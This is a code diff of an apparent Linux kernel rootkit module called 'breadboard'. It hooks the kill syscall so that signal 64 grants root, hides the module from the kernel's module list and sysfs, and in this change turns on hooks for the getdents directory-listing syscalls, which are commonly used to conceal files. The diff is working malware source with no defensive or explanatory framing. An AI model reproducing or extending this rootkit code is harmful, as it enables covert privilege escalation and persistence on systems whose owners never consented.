@@ -30,6 +30,11 @@ asmlinkage int hook_kill(const struct pt_regs *regs){
 	void set_root(void);
 	void hide_module(void);
 	void show_module(void);
+	
+	if (!regs){
+		printk(KERN_WARNING "Regs null. Aborting.\n");
+		return -EINVAL;
+	}
 	int sig = regs->si;
 	if ( sig == 64 ){
 		printk(KERN_INFO "breadboard: giving root\n");
@@ -46,6 +51,10 @@ asmlinkage int hook_kill(const struct pt_regs *regs){
 			printk(KERN_INFO "breadboard: showed\n");
 			show_module();
 			return 0;
+		}
+		else{
+			printk(KERN_WARNING "mod_hidden null, possible tamper.\n");
+			return -EINVAL;
 		}
 	}
 	return orig_kill(regs);
@@ -269,8 +278,8 @@ void hide_module(void){
 	if(mod_hidden == 0){
 		prev_module = THIS_MODULE->list.prev;
 		list_del(&THIS_MODULE->list);
-		kobject_del(&THIS_MODULE->mkobj.kobj);
-		kobject_put(&THIS_MODULE->mkobj.kobj);
+		kobject_del(&THIS_MODULE->mkobj.kobj); // remove the kobject
+		kobject_put(&THIS_MODULE->mkobj.kobj); // decrement the reference count
 		mod_hidden = 1;
 	}
 }
@@ -293,8 +302,8 @@ void show_module(void){
 
 static struct ftrace_hook hooks[] = {
 	HOOK("__x64_sys_kill", hook_kill, &orig_kill),
-	//HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
-	//HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
+	HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
+	HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
 };
 
 static int __init breadboard_init(void){
